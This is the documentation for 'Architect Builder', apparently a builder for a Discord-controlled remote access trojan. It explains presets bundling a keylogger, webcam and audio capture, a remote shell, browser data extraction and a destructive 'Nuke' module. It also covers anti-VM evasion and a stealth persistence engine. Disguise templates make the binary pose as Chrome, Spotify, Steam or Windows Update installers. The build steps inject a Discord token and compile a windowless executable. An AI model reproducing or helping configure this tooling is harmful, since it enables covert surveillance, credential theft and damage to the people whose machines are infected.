# 🛠️ Architect Builder Configuration

This document explains the features and options available in the Architect Builder CLI.

---

## 1. Presets Guide

Presets are pre-defined configurations optimized for specific use-cases.

### **🛡️ Full-Throttle (All-in-One)**
- **Included Modules:** Everything (Keylogger, Media, Shell, Nuke, Fun, etc.).
- **Anti-VM:** Enabled.
- **Stealth (Wraith):** Enabled.
- **Use-Case:** Maximum control over a target machine.

### **👻 Ghost (Extreme Stealth)**
- **Included Modules:** Shell, Screenshot, File Manager, Info, Keylogger.
- **Excluded Modules:** All "Fun", "Nuke", and "Media" (Webcam/Audio) to reduce binary size and detection profile.
- **Anti-VM:** Enabled.
- **Stealth (Wraith):** Enabled.
- **Use-Case:** Long-term, high-stealth monitoring and administration.

### **🧪 The Tester (VM Friendly)**
- **Included Modules:** Everything.
- **Anti-VM:** **DISABLED**.
- **Stealth (Wraith):** **DISABLED**.
- **Use-Case:** Safe local development or testing in virtual machines where the bot should NOT hide or persist.

### **🤡 Troll-Mode (High Visibility)**
- **Included Modules:** Media, Control, Fun, Screenshot.
- **Excluded Modules:** Browser extraction and Nuke (to avoid "real" damage).
- **Anti-VM:** Disabled.
- **Stealth (Wraith):** Disabled.
- **Use-Case:** Designed for pranks and visible remote interaction.

---

## 2. Disguise Templates

Disguises allow you to spoof the executable's appearance and metadata.

| Template | Icon | Description |
| :--- | :--- | :--- |
| **Google Chrome** | Chrome Logo | Spoofs "Google Chrome Installer" (Version 120.0). |
| **Spotify** | Spotify Logo | Spoofs "Spotify Music Player". |
| **Steam** | Steam Logo | Spoofs "Steam Client Bootstrapper". |
| **Windows Update** | Win Logo | Spoofs "Windows Service Host". |

---

## 3. The Build Process

When you run the `captainhook` command (after professional installation), the builder performs several steps:

1.  **Staging:** Copies the source code to a temporary `build_staging/` directory.
2.  **Injection:** Injects your Discord Token and Guild ID into `src/client/core/config.py`.
3.  **Optimization:** Edits `src/client/main.py` to only load the modules specified in your chosen Preset.
4.  **Toggling:** Disables/Enables Wraith Engine and Anti-VM checks based on the Preset.
5.  **Preparation:** Prepares the build for compilation into a single, standalone binary (using PyInstaller or Nuitka).

---

## 4. Final Compilation
After running the builder, you can compile the staged source into a single file:
```bash
# Recommended compilation command (Windows)
pyinstaller --onefile --noconsole --icon=path/to/icon.ico build_staging/src/client/main.py
```
